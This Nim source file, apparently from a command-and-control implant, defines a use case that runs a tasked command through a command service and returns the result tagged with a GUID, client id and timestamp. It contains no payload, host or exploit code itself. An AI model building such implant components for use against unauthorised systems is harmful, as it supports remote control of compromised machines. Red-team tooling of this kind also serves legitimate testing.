#[
    Use Case: ExecuteCommandUseCase
    Orchestrates command execution
    Applies Single Responsibility Principle
]#

import times
import ../../domain/models/command as cmdModel
import ../../domain/models/implant
import ../services/command_service

type
    ExecuteCommandUseCase* = object
        commandService*: CommandService
    
proc newExecuteCommandUseCase*(commandService: CommandService): ExecuteCommandUseCase =
    ## Create a new ExecuteCommandUseCase instance
    result = ExecuteCommandUseCase(commandService: commandService)

proc execute*(useCase: ExecuteCommandUseCase, implant: Implant, cmd: cmdModel.Command): cmdModel.CommandResult =
    ## Execute a command and return the result
    when defined debug:
        echo "[DEBUG] ExecuteCommandUseCase: Executing command: " & cmd.command & " (GUID: " & cmd.guid & ")"
    
    # Execute command using command service
    let resultStr = useCase.commandService.executeCommand(implant, cmd.command, cmd.guid, cmd.args)
    
    # Create command result directly
    let cmdResult = cmdModel.CommandResult(
        guid: cmd.guid,
        result: resultStr,
        clientId: implant.id,
        timestamp: epochTime().int64
    )
    
    when defined debug:
        echo "[DEBUG] ExecuteCommandUseCase: Command executed successfully (GUID: " & cmdResult.guid & ")"
    
    return cmdResult
